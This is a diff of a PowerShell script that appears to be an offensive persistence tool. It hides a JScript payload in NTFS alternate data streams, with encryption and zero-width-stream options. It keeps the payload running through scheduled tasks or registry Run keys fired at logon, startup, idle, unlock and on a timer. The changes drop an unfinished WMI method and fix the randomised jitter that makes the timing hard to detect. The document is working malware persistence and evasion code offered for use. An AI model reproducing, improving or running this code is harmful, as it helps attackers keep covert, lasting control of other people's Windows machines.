@@ -18,7 +18,6 @@ Examples:
 Available methods:
   task     - Scheduled Task (requires admin, logon + startup + periodic triggers)
   registry - Registry Run key (works as user or admin, companion task for periodic)
-  wmi      - WMI event subscription (not yet implemented)
   none     - No persistence (ADS only)
 
 Examples:
@@ -141,9 +140,9 @@ param(
     [switch]$PayloadAtRuntime,
     [string[]]$Targets = @('localhost'),
     
-    [ValidateSet('task', 'registry', 'wmi', 'none')]
+    [ValidateSet('task', 'registry', 'none')]
     [string]$Persist = 'task',
-    
+
     [switch]$Randomize,
     [switch]$Encrypt,
     [switch]$ZeroWidthStreams,
@@ -193,7 +192,7 @@ REQUIRED:
 
 OPTIONAL:
   -Targets <array>          Target hosts (default: @('localhost'))
-  -Persist <string>         Persistence method: task, registry, wmi, none
+  -Persist <string>         Persistence method: task, registry, none
   -Trigger <string[]>       Trigger types: AtLogOn, AtStartup, OnIdle, OnUnlock
   -PeriodicMinutes <int>    Periodic interval in minutes (default: 5)
   -JitterPercent <int>      Jitter percentage for timing (default: 20)
@@ -874,11 +873,14 @@ function Create-ScheduledTaskPersistence {
         $action = New-ScheduledTaskAction -Execute "wscript.exe" `
             -Argument "//B //E:JScript `"$jsPath`""
 
-        # --- Compute jitter delays ---
-        $jitterDelay = $null
+        # --- Compute jitter delay as ISO 8601 duration ---
+        # Task Scheduler XML requires ISO 8601 strings (PT#M) for both
+        # Delay (AtLogOn/AtStartup/OnUnlock) and RandomDelay (periodic) properties.
+        # TimeSpan objects serialize to HH:MM:SS which the XML parser rejects.
+        $jitterDelayISO = $null
         if ($JitterPercent -gt 0) {
             $jitterMinutes = [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
-            $jitterDelay = New-TimeSpan -Minutes $jitterMinutes
+            $jitterDelayISO = "PT${jitterMinutes}M"
         }
 
         # --- Build trigger array from all specified triggers ---
@@ -887,16 +889,19 @@ function Create-ScheduledTaskPersistence {
             switch ($t) {
                 'AtLogOn' {
                     $tObj = New-ScheduledTaskTrigger -AtLogOn
-                    if ($jitterDelay) { $tObj.RandomDelay = $jitterDelay }
+                    # MSFT_TaskLogonTrigger uses 'Delay' (ISO 8601), not 'RandomDelay'
+                    if ($jitterDelayISO) { $tObj.Delay = $jitterDelayISO }
                     $triggers += $tObj
                 }
                 'AtStartup' {
                     $tObj = New-ScheduledTaskTrigger -AtStartup
-                    if ($jitterDelay) { $tObj.RandomDelay = $jitterDelay }
+                    # MSFT_TaskBootTrigger uses 'Delay' (ISO 8601), not 'RandomDelay'
+                    if ($jitterDelayISO) { $tObj.Delay = $jitterDelayISO }
                     $triggers += $tObj
                 }
                 'OnIdle' {
                     # CIM idle trigger — fires when the system enters idle state
+                    # MSFT_TaskIdleTrigger has no delay property; idle duration is in task settings
                     $tObj = New-CimInstance -CimClass (
                         Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
                     ) -ClientOnly
@@ -904,10 +909,14 @@ function Create-ScheduledTaskPersistence {
                 }
                 'OnUnlock' {
                     # CIM session state change — fires every time a user unlocks (cheeky!)
+                    # MSFT_TaskSessionStateChangeTrigger uses 'Delay', set during CIM creation
+                    $unlockProps = @{ StateChange = [uint32]8 }  # 8 = SessionUnlock (TASK_SESSION_STATE_CHANGE_TYPE)
+                    if ($jitterDelayISO) {
+                        $unlockProps['Delay'] = $jitterDelayISO
+                    }
                     $tObj = New-CimInstance -CimClass (
                         Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
-                    ) -Property @{ StateChange = [uint32]8 } -ClientOnly  # 8 = SessionUnlock (TASK_SESSION_STATE_CHANGE_TYPE)
-                    if ($jitterDelay) { $tObj.RandomDelay = "PT$($jitterDelay.TotalMinutes)M" }
+                    ) -Property $unlockProps -ClientOnly
                     $triggers += $tObj
                 }
             }
@@ -918,7 +927,8 @@ function Create-ScheduledTaskPersistence {
             -At (Get-Date).AddMinutes(1) `
             -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) `
             -RepetitionDuration (New-TimeSpan -Days 9999)
-        if ($jitterDelay) { $triggerPeriodic.RandomDelay = $jitterDelay }
+        # RandomDelay also requires ISO 8601 string for Task Scheduler XML serialization
+        if ($jitterDelayISO) { $triggerPeriodic.RandomDelay = $jitterDelayISO }
         $triggers += $triggerPeriodic
 
         # --- Task settings (add idle config if OnIdle trigger is present) ---
@@ -1076,10 +1086,10 @@ function Create-RegistryPersistence {
             -Argument "//B //E:JScript `"$jsPath`""
 
         # Build companion triggers (periodic + cheeky)
-        $jitterDelay = $null
+        $jitterDelayISO = $null
         if ($JitterPercent -gt 0) {
             $jitterMinutes = [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
-            $jitterDelay = New-TimeSpan -Minutes $jitterMinutes
+            $jitterDelayISO = "PT${jitterMinutes}M"
         }
 
         $taskTriggers = @()
@@ -1088,7 +1098,7 @@ function Create-RegistryPersistence {
             -At (Get-Date).AddMinutes(1) `
             -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) `
             -RepetitionDuration (New-TimeSpan -Days 9999)
-        if ($jitterDelay) { $tPeriodic.RandomDelay = $jitterDelay }
+        if ($jitterDelayISO) { $tPeriodic.RandomDelay = $jitterDelayISO }
         $taskTriggers += $tPeriodic
 
         # OnIdle
@@ -1100,10 +1110,13 @@ function Create-RegistryPersistence {
         }
         # OnUnlock
         if ($Trigger -contains 'OnUnlock') {
+            $unlockProps = @{ StateChange = [uint32]8 }
+            if ($jitterDelayISO) {
+                $unlockProps['Delay'] = $jitterDelayISO
+            }
             $tUnlock = New-CimInstance -CimClass (
                 Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
-            ) -Property @{ StateChange = [uint32]8 } -ClientOnly
-            if ($jitterDelay) { $tUnlock.RandomDelay = "PT$($jitterDelay.TotalMinutes)M" }
+            ) -Property $unlockProps -ClientOnly
             $taskTriggers += $tUnlock
         }
 
@@ -1278,9 +1291,6 @@ if ($Persist -ne 'none') {
             } else {
                 Write-Error "Failed to create registry persistence"
             }
-        }
-        'wmi' {
-            Write-Warning "WMI persistence not implemented in this version"
         }
     }
 }
